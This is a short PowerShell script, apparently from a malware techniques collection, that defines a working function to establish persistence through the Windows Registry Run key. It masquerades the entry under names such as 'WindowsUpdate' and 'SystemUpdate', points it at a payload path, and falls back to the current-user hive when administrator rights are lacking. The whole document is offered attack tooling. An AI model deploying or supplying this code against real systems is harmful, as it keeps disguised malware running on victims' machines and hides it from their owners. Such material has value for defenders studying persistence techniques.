# Windows Persistence Example - Registry Run Key
# Based on persistence-mechanisms.md from malware skills

# This script creates a persistence mechanism via Windows Registry Run Key
# Requires execution with appropriate privileges

function Add-RegistryPersistence {
    param(
        [string]$PayloadPath = "C:\Windows\System32\svchost.exe",
        [string]$RegistryKeyName = "WindowsUpdate",
        [string]$RegistryHive = "HKCU"  # Use HKLM for system-wide (requires admin)
    )

    try {
        # Check if running with adequate privileges for HKLM
        if ($RegistryHive -eq "HKLM" -and (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
            Write-Warning "Administrator privileges required for HKLM persistence. Falling back to HKCU."
            $RegistryHive = "HKCU"
        }

        # Set the registry value
        Set-ItemProperty -Path "$RegistryHive:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryKeyName -Value $PayloadPath -ErrorAction Stop

        Write-Host "[+] Persistence established via $RegistryHive:\Software\Microsoft\Windows\CurrentVersion\Run"
        Write-Host "[+] Payload: $PayloadPath"
        Write-Host "[+] Registry Key: $RegistryKeyName"

        return $true
    }
    catch {
        Write-Error "[-] Failed to establish persistence: $_"
        return $false
    }
}

# Example usage:
# Add-RegistryPersistence -PayloadPath "C:\Users\Public\Documents\update.exe" -RegistryKeyName "SystemUpdate"

# For demonstration, we'll just show what would be done
Write-Host "Windows Persistence Example - Registry Run Key"
Write-Host "To use: Add-RegistryPersistence -PayloadPath '<path_to_payload>' -RegistryKeyName '<keyname>'"
Write-Host ""
Write-Host "Example:"
Write-Host "Add-RegistryPersistence -PayloadPath 'C:\Windows\System32\svchost.exe' -RegistryKeyName 'WindowsUpdate'"